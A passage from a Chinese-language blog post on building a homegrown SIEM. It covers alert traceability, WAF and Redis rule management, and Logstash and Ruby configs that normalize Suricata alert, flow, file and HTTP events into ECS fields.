<h2 id="4-溯源分析"><a href="#4-溯源分析" class="headerlink" title="4. 溯源分析"></a>4. 溯源分析</h2><p>目前SIEM产生的告警，并不会携带原始的安全事件，这对于分析小伙伴来说并不友好，特别是告警量比较多的时候。</p>
<ul>
<li>现已为每一个告警增加了**”Hunting”**的字段，通过该字段可直接溯源到底层的安全事件；</li>
<li>增加了更适用于安全分析人员使用的仪表盘；</li>
<li>编写了一个<strong>自认为</strong>比较贴合分析人员使用的工具：<strong>HappyHunting</strong>；</li>
</ul>
<h2 id="5-其他改进"><a href="#5-其他改进" class="headerlink" title="5. 其他改进"></a>5. 其他改进</h2><ul>
<li><p>解决了SIEM联动CDN WAF API响应时间过长（15-20分钟 😅）的问题。目前与Imperva WAF API联动已做到了准实时。</p>
</li>
<li><p>优化NTA login_audit代码，提升NTA性能。之前写过一篇文章《**<a target="_blank" rel="noopener" href="https://canon88.github.io/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/">Suricata + Lua实现本地情报对接</a>**》，主要利用了Lua脚本对“敏感”接口进行登录审计并利用情报进行高危账号检测。现已将这部分功能移植到Logstash + Ruby上；</p>
</li>
<li><p>之前的自动化联动规则都是通过手动修改脚本调整<strong>rule.id</strong>来实现，这种方式在初期还能勉强运行。但在后期运行中暴露出了不足，既不便于管理也增加了维护的成本。所以为了维护SIEM的规则，这里采用了Redis来进行规则的统一管理。后期只需要将需要阻断的<strong>rule.id</strong>推送至Redis即可。同时也在输出的告警中通过<strong>event.action</strong>字段标准该告警的响应方式；</p>
</li>
</ul>
<hr>
<h1 id="“进化”-“散装”SIEM-v0-2"><a href="#“进化”-“散装”SIEM-v0-2" class="headerlink" title="“进化” - “散装”SIEM v0.2"></a>“进化” - “散装”SIEM v0.2</h1><h2 id="1-Workflow"><a href="#1-Workflow" class="headerlink" title="1. Workflow"></a>1. Workflow</h2><p>​        这是重新调整之后的<strong>“散装”SIEM v0.2</strong>的workflow😁。如下图所示，数据源采集端这里就不展开来说了，都是现成的工具发就完事儿了。下面主要说一下Logstash中对数据处理的部分：</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-v0.2.jpg" alt="SIEM-v0.2"></p>
<hr>
<h2 id="2-数据处理"><a href="#2-数据处理" class="headerlink" title="2. 数据处理"></a>2. 数据处理</h2><h3 id="1-Normalized"><a href="#1-Normalized" class="headerlink" title="1. Normalized"></a>1. Normalized</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/normalized-04.png" alt="image-20201208110506481"></p>
<hr>
<h4 id="1-1-normalized-alert-to-siem"><a href="#1-1-normalized-alert-to-siem" class="headerlink" title="1.1 normalized-alert_to_siem"></a>1.1 normalized-alert_to_siem</h4><p>​        针对alert事件进行标准化，也就是安全设备发出的数据。参考上图中蓝色线所示部分</p>
<p>​        官方已支持Suricata数据的ECS，我们可直接启用filebeat的Suricata模块。<strong>但是</strong>，这里需要注意一点，默认Suricata的模块中有一些标准化是交由Elastic来做的。由于我们需要利用Logstash做后续的ETL部分，所以现在的整个数据流是：<strong>Filebeat -&gt; Logstash -&gt; Elastic</strong>。那么，这一部分的标准化，需要我们在Logstash层面来实现。具体涉及到的配置如下：</p>
<h5 id="1-1-1-normalized-suricata"><a href="#1-1-1-normalized-suricata" class="headerlink" title="1.1.1 normalized-suricata"></a>1.1.1 normalized-suricata</h5><p>​    通用Suricata事件标准化配置。</p>
<ul>
<li>删除一些filebeat自带的字段。</li>
<li>增加<code>provider</code>、<code>product</code>、<code>sensor</code>等字段，为了后期区分不同的数据源类型，（例：<strong>NTA、WAF、EDR</strong>），以及不同的NTA产品（例：<strong>Suricata、Zeek</strong>）</li>
</ul>
<h6 id="Logstash-Config"><a href="#Logstash-Config" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/59_normalized-suricata.conf">normalized-suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;application&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;agent&quot;</span>, <span class="string">&quot;@version&quot;</span>, <span class="string">&quot;[event][original]&quot;</span> ]</span><br><span class="line">        add_field =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;provider&quot;</span> =&gt; <span class="string">&quot;Suricata&quot;</span></span><br><span class="line">            <span class="string">&quot;product&quot;</span> =&gt; <span class="string">&quot;IDS&quot;</span></span><br><span class="line">            <span class="string">&quot;sensor&quot;</span> =&gt; <span class="string">&quot;%&#123;[host][name]&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        lowercase =&gt; [ <span class="string">&quot;[network][transport]&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">    uuid &#123;</span><br><span class="line">        target =&gt; <span class="string">&quot;[event][id]&quot;</span></span><br><span class="line">        overwrite =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-2-normalized-alert-for-suricata"><a href="#1-1-2-normalized-alert-for-suricata" class="headerlink" title="1.1.2 normalized-alert_for_suricata"></a>1.1.2 normalized-alert_for_suricata</h5><h6 id="Logstash-Config-1"><a href="#Logstash-Config-1" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-alert.conf">normalized-alert_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][category]&quot;</span> =&gt; <span class="string">&quot;[rule][category]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][signature_id]&quot;</span> =&gt; <span class="string">&quot;[rule][id]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][signature]&quot;</span> =&gt; <span class="string">&quot;[rule][name]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][rule]&quot;</span> =&gt; <span class="string">&quot;[rule][description]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            convert =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            copy =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[rule][category]&quot;</span> =&gt; <span class="string">&quot;message&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [suricata][eve][alert][action] == <span class="string">&quot;blocked&quot;</span> &#123;</span><br><span class="line">            mutate &#123;</span><br><span class="line">                update =&gt; &#123;</span><br><span class="line">                    <span class="string">&quot;[suricata][eve][alert][action]&quot;</span> =&gt; <span class="string">&quot;denied&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [suricata][eve][alert][action] &#123;</span><br><span class="line">            ruby &#123;</span><br><span class="line">                code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                    action = event.get(&#x27;[suricata][eve][alert][action]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    event_type = event.get(&#x27;[event][type]&#x27;)</span></span><br><span class="line"><span class="string">                    if event_type then</span></span><br><span class="line"><span class="string">                        event_type = event.get(&#x27;[event][type]&#x27;).push(action)</span></span><br><span class="line"><span class="string">                    else</span></span><br><span class="line"><span class="string">                        event_type = [action]</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[event][type]&#x27;, event_type)</span></span><br><span class="line"><span class="string">                    event.remove(&#x27;[suricata][eve][alert][action]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    event.set(&#x27;[event][action]&#x27;, action)</span></span><br><span class="line"><span class="string">                &quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][severity]&quot;</span> =&gt; <span class="string">&quot;[event][severity]&quot;</span> </span><br><span class="line">                <span class="string">&quot;[suricata][eve][payload_printable]&quot;</span> =&gt; <span class="string">&quot;[rule][payload]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_request_body_printable]&quot;</span> =&gt; <span class="string">&quot;[http][request][body][content]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_response_body_printable]&quot;</span> =&gt; <span class="string">&quot;[http][response][body][content]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                rule_id = event.get(&#x27;[rule][id]&#x27;)</span></span><br><span class="line"><span class="string">                rule_name = event.get(&#x27;[rule][name]&#x27;)</span></span><br><span class="line"><span class="string">                event_id = event.get(&#x27;[event][id]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][rule][id]&#x27;, [rule_id])</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][rule][name]&#x27;, [rule_name])</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][event][id]&#x27;, [event_id])</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-3-normalized-fileinfo-for-suricata"><a href="#1-1-3-normalized-fileinfo-for-suricata" class="headerlink" title="1.1.3 normalized-fileinfo_for_suricata"></a>1.1.3 normalized-fileinfo_for_suricata</h5><h6 id="Logstash-Config-2"><a href="#Logstash-Config-2" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-fileinfo.conf">normalized-fileinfo_for_suricatra.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][fileinfo] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][fileinfo][filename]&quot;</span> =&gt; <span class="string">&quot;[file][path]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][fileinfo][size]&quot;</span> =&gt; <span class="string">&quot;[file][size]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-4-normalized-flow-for-suricata"><a href="#1-1-4-normalized-flow-for-suricata" class="headerlink" title="1.1.4 normalized-flow_for_suricata"></a>1.1.4 normalized-flow_for_suricata</h5><h6 id="Logstash-Config-3"><a href="#Logstash-Config-3" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-flow.conf">normalized-flow_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][flow] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][pkts_toclient]&quot;</span> =&gt; <span class="string">&quot;[destination][packets]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][pkts_toserver]&quot;</span> =&gt; <span class="string">&quot;[source][packets]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][bytes_toclient]&quot;</span> =&gt; <span class="string">&quot;[destination][bytes]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][bytes_toserver]&quot;</span> =&gt; <span class="string">&quot;[source][bytes]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                @sb = 0</span></span><br><span class="line"><span class="string">                @sp = 0</span></span><br><span class="line"><span class="string">                @db = 0</span></span><br><span class="line"><span class="string">                @dp = 0</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line"></span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                events = event.to_hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if events.has_key?(&#x27;source&#x27;) then</span></span><br><span class="line"><span class="string">                    @sb = events[&#x27;source&#x27;].fetch(&#x27;bytes&#x27;, 0)</span></span><br><span class="line"><span class="string">                    @sp = events[&#x27;source&#x27;].fetch(&#x27;packets&#x27;, 0)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if events.has_key?(&#x27;destination&#x27;) then</span></span><br><span class="line"><span class="string">                    @db = events[&#x27;destination&#x27;].fetch(&#x27;bytes&#x27;, 0)</span></span><br><span class="line"><span class="string">                    @dp = events[&#x27;destination&#x27;].fetch(&#x27;packets&#x27;, 0)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (@sb+@db+@sp+@dp &gt; 0) then</span></span><br><span class="line"><span class="string">                    if (@sb+@db &gt; 0) then</span></span><br><span class="line"><span class="string">                        event.set(&#x27;[network][bytes]&#x27;, @sb+@db)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                    if (@sp+@dp &gt; 0) then</span></span><br><span class="line"><span class="string">                        event.set(&#x27;[network][packets]&#x27;, @sp+@dp)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        date &#123;</span><br><span class="line">            match =&gt; [ <span class="string">&quot;[suricata][eve][flow][start]&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">            target =&gt; <span class="string">&quot;[event][start]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        date &#123;</span><br><span class="line">            match =&gt; [ <span class="string">&quot;[suricata][eve][flow][end]&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">            target =&gt; <span class="string">&quot;[event][end]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][age]&quot;</span> =&gt; <span class="string">&quot;[event][duration]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            remove_field =&gt; [</span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][start]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][end]&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-5-normalized-http-for-suricata"><a href="#1-1-5-normalized-http-for-suricata" class="headerlink" title="1.1.5 normalized-http_for_suricata"></a>1.1.5 normalized-http_for_suricata</h5><h6 id="Logstash-Config-4"><a href="#Logstash-Config-4" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-http.conf">normalized-http_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][http] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_method]&quot;</span> =&gt; <span class="string">&quot;[http][request][method]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][status]&quot;</span> =&gt; <span class="string">&quot;[http][response][status_code]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][hostname]&quot;</span> =&gt; <span class="string">&quot;[destination][domain]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [destination][domain] and [network][protocol] == <span class="string">&quot;http&quot;</span> &#123;</span><br><span class="line">            mutate &#123;</span><br><span class="line">                copy =&gt; &#123; <span class="string">&quot;[destination][domain]&quot;</span> =&gt; <span class="string">&quot;[url][domain]&quot;</span> &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                @pattern = /(?&lt;path&gt;[^?#]*)(?:\?(?&lt;query&gt;[^#]*))?(?:#(?&lt;fragment&gt;.*))?/</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                url = event.get(&#x27;[suricata][eve][http][url]&#x27;)</span></span><br><span class="line"><span class="string">                res = @pattern.match(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if res[&#x27;path&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][path]&#x27;, res[&#x27;path&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                if res[&#x27;query&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][query]&#x27;, res[&#x27;query&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                if res[&#x27;fragment&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][fragment]&#x27;, res[&#x27;fragment&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][url]&quot;</span> =&gt; <span class="string">&quot;[url][original]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_refer]&quot;</span> =&gt; <span class="string">&quot;[http][request][referrer]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][length]&quot;</span> =&gt; <span class="string">&quot;[http][response][body][bytes]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_user_agent]&quot;</span> =&gt; <span class="string">&quot;[user_agent][original]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-6-normalized-http-headers-for-suricata"><a href="#1-1-6-normalized-http-headers-for-suricata" class="headerlink" title="1.1.6 normalized_http_headers_for_suricata"></a>1.1.6 normalized_http_headers_for_suricata</h5><p>​        当<strong>Suricata</strong>设置<code>dump-all-headers:both</code>时，会将HTTP头全部输出。对于http_audit这个需求而言是个很好的功能，只不过输出的格式有点坑😂😂😂。为了更方便的在Kibana上进行筛选，我对这部分数据进行了标准化。😁</p>
<h6 id="Logstash-Config-5"><a href="#Logstash-Config-5" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-http.conf">normalized_http_headers_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][http] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/normalized_http_headers.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code"><a href="#Ruby-Code" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/normalized_http_headers.rb">normalized_http_headers_for_suricata.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    request = &#123;&#125;</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    request_headers = event.get(<span class="string">&quot;[suricata][eve][http][request_headers]&quot;</span>)</span><br><span class="line">    response_headers = event.get(<span class="string">&quot;[suricata][eve][http][response_headers]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request_headers <span class="keyword">then</span></span><br><span class="line">        request_headers.each <span class="keyword">do</span> <span class="params">|headers|</span></span><br><span class="line">            name = headers[<span class="string">&#x27;name&#x27;</span>].downcase</span><br><span class="line">            value = headers[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">            request[name] = value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response_headers <span class="keyword">then</span></span><br><span class="line">        response_headers.each <span class="keyword">do</span> <span class="params">|headers|</span></span><br><span class="line">            name = headers[<span class="string">&#x27;name&#x27;</span>].downcase</span><br><span class="line">            value = headers[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">            response[name] = value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.remove(<span class="string">&quot;[suricata][eve][http][request_headers]&quot;</span>)</span><br><span class="line">    event.remove(<span class="string">&quot;[suricata][eve][http][response_headers]&quot;</span>)</span><br><span class="line">    event.set(<span class="string">&quot;[suricata][eve][http][request]&quot;</span>, request)</span><br><span class="line">    event.set(<span class="string">&quot;[suricata][eve][http][response]&quot;</span>, response)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h6><ul>
<li>标准化之前的数据：</li>
</ul>
